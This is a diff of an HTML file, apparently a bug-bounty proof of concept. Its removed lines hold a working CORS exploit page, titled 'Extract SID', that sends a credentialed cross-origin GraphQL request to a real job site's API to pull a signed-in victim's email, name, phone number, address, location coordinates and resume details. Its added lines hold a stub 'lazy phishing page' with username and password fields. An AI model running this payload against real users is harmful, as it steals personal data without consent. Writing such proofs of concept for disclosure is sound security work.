@@ -1,29 +1,12 @@
-<!DOCTYPE html>
 <html>
 <body>
-<center>
-<h2>CORS POC Exploit</h2>
-<h3>Extract SID</h3>
- 
-<div id="demo">
-<button type="button" onclick="cors()">Exploit</button>
-</div>
- 
-<script>
-function cors() {
-  var xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://apis.indeed.com/graphql", true);
-        xhr.setRequestHeader("Accept", "application\/json, text\/plain, *\/*");
-        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.7,ar-MA;q=0.3");
-        xhr.setRequestHeader("Content-Type", "application\/json;charset=utf-8");
-        xhr.withCredentials = true;
-        var body = '{"operationName":"ResumeSection","variables":{},"query":"query ResumeSection {\n  currentUser {\n    account {\n      id\n      ... on PassportAccount {\n        emailAddress\n        isConfirmed\n        accountId\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  jobSeekerProfile {\n    profile {\n      ...profileContactInfo\n      resume {\n        ...resumeContactInfo\n        ...resumeSectionFields\n        __typename\n      }\n      ...fileInformation\n      fraudMetadata {\n        state\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment profileContactInfo on JobSeekerProfile {\n  accountKey\n  defaultInfo {\n    contactInformation {\n      firstName\n      lastName\n      location {\n        address\n        city\n        admin1\n        postalCode\n        country\n        unknownLocation\n        latitude\n        longitude\n        __typename\n      }\n      phoneNumber\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment resumeContactInfo on JobSeekerProfileResume {\n  id\n  locale\n  firstName\n  lastName\n  firstNameFurigana\n  lastNameFurigana\n  phoneNumber\n  showPhoneNumber\n  headline\n  location {\n    address\n    address2\n    city\n    admin1\n    postalCode\n    country\n    formattedLocation\n    unknownLocation\n    latitude\n    longitude\n    __typename\n  }\n  resumeType\n  wordCount\n  employmentEligibilities {\n    employmentEligibility\n    id\n    __typename\n  }\n  __typename\n}\n\nfragment resumeSectionFields on JobSeekerProfileResume {\n  id\n  state\n  resumeType\n  dateModified\n  wordCount\n  __typename\n}\n\nfragment fileInformation on JobSeekerProfile {\n  fileInformation {\n    id\n    clientApp\n    extension\n    fileName\n    fileType\n    mediaType\n    tags\n    uploadTimestamp\n    __typename\n  }\n  __typename\n}\n"}';
-        var aBody = new Uint8Array(body.length);
-        for (var i = 0; i < aBody.length; i++)
-          aBody[i] = body.charCodeAt(i); 
-        xhr.send(new Blob([aBody]));
-}
-</script>
- 
+  <h1>
+    Hi I am lazy phishing page
+  </h1>
+  <form id="aa" action="#">
+    <input type="text" placeholder="Username">
+    <input id="user" type="password" placeholder="Password here">
+    <input id="pass" type="submit" value="Submit">
+  </form>
 </body>
 </html>
